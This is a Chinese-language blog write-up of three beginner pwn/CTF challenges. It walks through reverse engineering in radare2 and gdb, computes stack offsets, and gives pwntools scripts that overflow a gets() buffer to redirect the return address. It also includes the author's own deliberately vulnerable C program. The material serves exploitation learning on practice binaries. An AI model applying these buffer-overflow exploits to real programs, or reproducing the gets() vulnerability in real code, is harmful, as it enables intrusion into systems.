---
title: pwn write up
tags: [pwn, thinking]
style: border
color: dark
description: Pwn write up
---

### 一些pwn题的writeup  

&emsp;&emsp;pwn题就是好玩,做了几道题，写一波writeUp。  
&emsp;&emsp;点击标题可下载题目。  

![alias](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_0.jpeg?raw=true)  

#### [1. crackme0x00](https://github.com/Explainaur/hexo-blog/blob/master/source/file/bin-linux/crackme0x00)

&emsp;&emsp;首先我们把这玩意扔到radare2里，先逆了再说。  
&emsp;&emsp;看了一下main()大概长着个样子：  

![main](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_1.png?raw=true)  

&emsp;&emsp;然后下面的分支大概长这个样子：  

![brench](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_2.png?raw=true)  

&emsp;&emsp;大概意思就是，假如我输入的字符串等于250382就算我成功了。本身到这里其实题目已经做完了，但是为了实践stackoverflow，我们要用厉害的方法。

&emsp;&emsp;我们可以看到有一个局部变量 **char *s1 @ ebp-0x18** 这说明这个字符串距离栈基址有 **0x18 (24byte)** 这么远.那么此时 **s1** 就距离 **return_address** 有 0x18+4 这么远.这个时候，我们就可以做一些恶心的事情，比如：  

```python 
from pwn import *   

sh = process('./crackme0x00')

payload = 'a'*0x18 + 'bbbb' + p32(0x8048480)

sh.sendline(payload)

sh.interactive()

```

&emsp;&emsp;我们这样构造payload的原因是，我们希望 **return** 的地址是我们想要的指令.我们前面输入了一堆aaa和bbbb这是为啥嘞？24个a为了填充s1与esp的值的间隔，而4个b则是为了恰好覆盖ebp.  
&emsp;&emsp;这样一来，后面的 **p32(0x8048480)** 就恰好存到了return_address的位置，也就起到了我们要的劫持指令的效果。结果长下面这样：  

![result](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_3.png?raw=true)  

#### [2. ret2text](https://github.com/Explainaur/hexo-blog/blob/master/source/file/ret2text)  

&emsp;&emsp;这个题稍微有点难度，我们用r2先逆为敬.  
&emsp;&emsp;main()大概长下面这样：  

![main](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_4.png?raw=true)  

&emsp;&emsp;我们可以看到里面有 **gets()** 函数，这个东西是坨垃圾，他不限制输入的长度，所以很有可能把缓冲区怼爆，所以我们就想法子日这个函数。  
&emsp;&emsp;我们看到里面有个局部变量 **char \*s @ esp+0x1c** ,gets()函数的值就存在s里面。这个时候我们不禁萌生了一些猥琐的想法。  
&emsp;&emsp;我们接着看其他还有啥函数，毕竟main()里没有好利用的东西，这个时候我们发现了 **sym.secure** 这个函数：  

![sym.secure](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_5.png?raw=true)  

&emsp;&emsp;我们仔细看了一下发现，果然里面有见不得人的东西，它调用了 **system("/bin/bash")**,这我们还能说什么，直接跳转到 **0x0804863a** 日了他完事。下面就是愉快的编写payload，我灵机一动发现事情并不简单，这个局部变量并不是基于 **ebp** 的偏移地址，而是基于 **esp** 栈顶指针给出的，不知道他用了什么妖术。这样的话我们只好用gdb动态调试：  

![gdb](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_6.png?raw=true)  

&emsp;&emsp;我们在**gets()**那里打上断点，然后看一下寄存器的值：  

```
$esp -> 0xffffd030

$ebp -> 0xffffd0b8

s @ $esp+0x1c -> 0xffffd04c

($ebp - s) -> 0xfffd0b8 - 0xffffd04c = 0x6c

```

&emsp;&emsp;一顿帅气操作我们已经得到了s基于**ebp**的偏移地址，下面我们就愉快的写payload：  

```python
from pwn import *    

sh = process('./ret2text')

target = 0x0804863a  

payload = 'a'*0x6c + 'bbbb' + p32(target)

sh.sendline(payload) 

sh.interactive()     
```

&emsp;&emsp;下面就是我们的结果：  

![result](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_7.png?raw=true)  

#### [3. babyPwn](https://github.com/Explainaur/hexo-blog/blob/master/source/file/1)  

&emsp;&emsp;这个题就比较简单了，程序也是我自己写的，下面是源码：  

```c
#include <stdio.h>   
#include <string.h>  

void success() { 
    puts("You Hava already controlled it."); 
}

void vulnerable() {
    char s[12];        
    gets(s);           
    puts(s);           
    return;            
}
 
int main(int argc, char **argv) {
    vulnerable();
    return 0;          
}
```
&emsp;&emsp;直接逆,main()和sym.vulnerable()大概下面这样：  

![main&vulnerable](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_8.png?raw=true)  

&emsp;&emsp;这个逻辑也比较简单，我们看main()里面好像啥也没有，接着看**vulnerable()**里面又出现了gets()这种东西，好了怼他，我们看到这个局部变量**char s @ ebp-0x14**中规中矩，给的也是基于 **ebp** 的偏移地址。  
&emsp;&emsp;接着我们看一看别的函数，里面有个醒目的 **sym.success** 是结果没跑了，一看长这样：  

![sym.success](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_9.png?raw=true)  

&emsp;&emsp;那我们就直接把success()的地址放在vulnerable()的返回值那里，让他直接跳转，思路清晰，下面愉快的写payload：  


```python
from pwn import *

sh = process('./1')

success_addr = 0x08049172

payload = 'a' * 20 + 'bbbb' + p32(success_addr)

print p32(success_addr)
sh.sendline(payload)

sh.interactive()
```

&emsp;&emsp;然后结果就长这个样子：  

![result](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_10.png?raw=true)  

---  
### 总结  

&emsp;&emsp;总之，我认为pwn是入侵的最高境界，是一种暴力美学，如果说web能拿到一些主机的权限，那么pwn能拿到世界上所有主机的权限。  
&emsp;&emsp;漏洞的利用千奇百怪，绝不要被教条束缚了头脑，始终忘不了第一次见到如此简洁的shellcode时的惊讶。二进制就像魔法，我就是寻求刺激的魔法师。
&emsp;&emsp;以上三道题目是入门题，我要走的路还很长。





















